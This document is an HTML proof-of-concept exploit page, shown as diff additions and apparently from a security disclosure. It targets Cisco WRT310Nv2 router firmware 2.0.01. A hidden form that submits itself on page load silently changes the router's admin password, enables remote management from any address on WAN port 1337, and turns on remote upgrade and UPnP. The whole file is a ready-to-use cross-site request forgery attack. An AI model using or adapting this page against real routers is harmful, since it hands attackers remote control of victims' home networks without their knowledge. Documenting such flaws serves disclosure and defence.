@@ -1,0 +1,32 @@
+d&gt;
+&lt;title&gt;Cisco WRT310Nv2 Firmware v2.0.01 CSRF/XSS&lt;/title&gt;
+&lt;!--*Discovered by: Jacob Holcomb 
+	- Security Analyst @ Independent Security Evaluators --&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+
+&lt;form name=&quot;CSRFxssPWN&quot; action=&quot;http://ww.example.com/apply.cgi&quot; method=&quot;post&quot;/&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;submit_button&quot; value=&quot;Management&quot;/&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;action&quot; value=&quot;Apply&quot;/&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;PasswdModify&quot; value=&quot;1&quot;/&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;http_enable&quot; value=&quot;1&quot;/&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;wait_time&quot; value=&quot;0&quot;/&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;http_passwd&quot; value=&quot;ISE_1337&quot;/&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;http_passwdConfirm&quot; value=&quot;ISE_1337&quot;/&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;_http_enable&quot; value=&quot;1&quot;/&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;remote_management&quot; value=&quot;1&quot;/&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;remote_upgrade&quot; value=&quot;1&quot;/&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;remote_ip_any&quot; value=&quot;1&quot;/&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;http_wanport&quot; value=&quot;1337&quot;/&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;upnp_enable&quot; value=&quot;1&quot;/&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;upnp_config&quot; value=&quot;1&quot;/&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;upnp_internet_dis&quot; value=&quot;1&quot;/&gt;
+&lt;/form&gt;
+
+&lt;script&gt;
+function PwN() {document.CSRFxssPWN.submit();}; window.setTimeout(PwN, 0025);
+&lt;/script&gt;
+
+&lt;body&gt;
+&lt;/html&gt;
